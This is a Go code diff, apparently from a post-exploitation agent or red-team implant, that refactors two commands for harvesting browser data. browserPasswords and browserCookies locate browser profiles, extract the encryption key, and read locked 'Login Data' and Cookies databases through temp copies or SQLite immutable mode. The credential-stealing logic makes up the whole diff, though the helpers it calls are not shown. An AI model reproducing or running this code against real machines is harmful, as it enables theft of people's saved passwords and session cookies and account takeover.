@@ -284,57 +284,59 @@ func browserPasswords(args browserArgs) structs.CommandResult {
 	var errors []string
 
 	for browserName, userDataDir := range paths {
-		// Check if browser is installed
-		if _, err := os.Stat(userDataDir); os.IsNotExist(err) {
-			continue
-		}
+		func() {
+			// Check if browser is installed
+			if _, err := os.Stat(userDataDir); os.IsNotExist(err) {
+				return
+			}
 
-		// Get the encryption key
-		key, err := getEncryptionKey(userDataDir)
-		if err != nil {
-			errors = append(errors, fmt.Sprintf("%s: %v", browserName, err))
-			continue
-		}
-		defer structs.ZeroBytes(key)
+			// Get the encryption key
+			key, err := getEncryptionKey(userDataDir)
+			if err != nil {
+				errors = append(errors, fmt.Sprintf("%s: %v", browserName, err))
+				return
+			}
+			defer structs.ZeroBytes(key)
 
-		// Find all profiles
-		profiles := findProfiles(userDataDir)
-		if len(profiles) == 0 {
-			errors = append(errors, fmt.Sprintf("%s: no profiles with Login Data found", browserName))
-			continue
-		}
+			// Find all profiles
+			profiles := findProfiles(userDataDir)
+			if len(profiles) == 0 {
+				errors = append(errors, fmt.Sprintf("%s: no profiles with Login Data found", browserName))
+				return
+			}
 
-		for _, profileDir := range profiles {
-			loginDataPath := filepath.Join(profileDir, "Login Data")
-			profileName := filepath.Base(profileDir)
+			for _, profileDir := range profiles {
+				loginDataPath := filepath.Join(profileDir, "Login Data")
+				profileName := filepath.Base(profileDir)
 
-			// Strategy 1: Copy DB to temp file, open from copy
-			tf, tfErr := os.CreateTemp("", "")
-			if tfErr == nil {
-				tmpFile := tf.Name()
-				tf.Close()
-				if copyErr := copyFile(loginDataPath, tmpFile); copyErr == nil {
-					creds, readErr := readLoginData(tmpFile, key, browserName, profileName)
-					secureRemove(tmpFile)
-					if readErr == nil {
-						allCreds = append(allCreds, creds...)
+				// Strategy 1: Copy DB to temp file, open from copy
+				tf, tfErr := os.CreateTemp("", "")
+				if tfErr == nil {
+					tmpFile := tf.Name()
+					tf.Close()
+					if copyErr := copyFile(loginDataPath, tmpFile); copyErr == nil {
+						creds, readErr := readLoginData(tmpFile, key, browserName, profileName)
+						secureRemove(tmpFile)
+						if readErr == nil {
+							allCreds = append(allCreds, creds...)
+							continue
+						}
+						errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, readErr))
 						continue
 					}
-					errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, readErr))
+					secureRemove(tmpFile)
+				}
+
+				// Strategy 2: Open locked DB directly in immutable mode
+				immutableURI := "file:///" + filepath.ToSlash(loginDataPath) + "?immutable=1"
+				creds, err := readLoginData(immutableURI, key, browserName, profileName)
+				if err != nil {
+					errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, err))
 					continue
 				}
-				secureRemove(tmpFile)
+				allCreds = append(allCreds, creds...)
 			}
-
-			// Strategy 2: Open locked DB directly in immutable mode
-			immutableURI := "file:///" + filepath.ToSlash(loginDataPath) + "?immutable=1"
-			creds, err := readLoginData(immutableURI, key, browserName, profileName)
-			if err != nil {
-				errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, err))
-				continue
-			}
-			allCreds = append(allCreds, creds...)
-		}
+		}()
 	}
 
 	// Format output
@@ -503,55 +505,57 @@ func browserCookies(args browserArgs) structs.CommandResult {
 	var errors []string
 
 	for browserName, userDataDir := range paths {
-		if _, err := os.Stat(userDataDir); os.IsNotExist(err) {
-			continue
-		}
+		func() {
+			if _, err := os.Stat(userDataDir); os.IsNotExist(err) {
+				return
+			}
 
-		key, err := getEncryptionKey(userDataDir)
-		if err != nil {
-			errors = append(errors, fmt.Sprintf("%s: %v", browserName, err))
-			continue
-		}
-		defer structs.ZeroBytes(key)
+			key, err := getEncryptionKey(userDataDir)
+			if err != nil {
+				errors = append(errors, fmt.Sprintf("%s: %v", browserName, err))
+				return
+			}
+			defer structs.ZeroBytes(key)
 
-		profiles := findCookieProfiles(userDataDir)
-		if len(profiles) == 0 {
-			errors = append(errors, fmt.Sprintf("%s: no profiles with Cookies found", browserName))
-			continue
-		}
+			profiles := findCookieProfiles(userDataDir)
+			if len(profiles) == 0 {
+				errors = append(errors, fmt.Sprintf("%s: no profiles with Cookies found", browserName))
+				return
+			}
 
-		for _, profileDir := range profiles {
-			dbPath := cookieDBPath(profileDir)
-			profileName := filepath.Base(profileDir)
+			for _, profileDir := range profiles {
+				dbPath := cookieDBPath(profileDir)
+				profileName := filepath.Base(profileDir)
 
-			// Strategy 1: Copy DB to temp file, open from copy
-			tf, tfErr := os.CreateTemp("", "")
-			if tfErr == nil {
-				tmpFile := tf.Name()
-				tf.Close()
-				if copyErr := copyFile(dbPath, tmpFile); copyErr == nil {
-					cookies, readErr := readCookieData(tmpFile, key, browserName, profileName)
-					secureRemove(tmpFile)
-					if readErr == nil {
-						allCookies = append(allCookies, cookies...)
+				// Strategy 1: Copy DB to temp file, open from copy
+				tf, tfErr := os.CreateTemp("", "")
+				if tfErr == nil {
+					tmpFile := tf.Name()
+					tf.Close()
+					if copyErr := copyFile(dbPath, tmpFile); copyErr == nil {
+						cookies, readErr := readCookieData(tmpFile, key, browserName, profileName)
+						secureRemove(tmpFile)
+						if readErr == nil {
+							allCookies = append(allCookies, cookies...)
+							continue
+						}
+						errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, readErr))
 						continue
 					}
-					errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, readErr))
+					secureRemove(tmpFile)
+				}
+
+				// Strategy 2: Open locked DB directly in immutable mode (no locking)
+				// URI format tells SQLite the file won't change, skipping all locks
+				immutableURI := "file:///" + filepath.ToSlash(dbPath) + "?immutable=1"
+				cookies, err := readCookieData(immutableURI, key, browserName, profileName)
+				if err != nil {
+					errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, err))
 					continue
 				}
-				secureRemove(tmpFile)
+				allCookies = append(allCookies, cookies...)
 			}
-
-			// Strategy 2: Open locked DB directly in immutable mode (no locking)
-			// URI format tells SQLite the file won't change, skipping all locks
-			immutableURI := "file:///" + filepath.ToSlash(dbPath) + "?immutable=1"
-			cookies, err := readCookieData(immutableURI, key, browserName, profileName)
-			if err != nil {
-				errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, err))
-				continue
-			}
-			allCookies = append(allCookies, cookies...)
-		}
+		}()
 	}
 
 	var sb strings.Builder
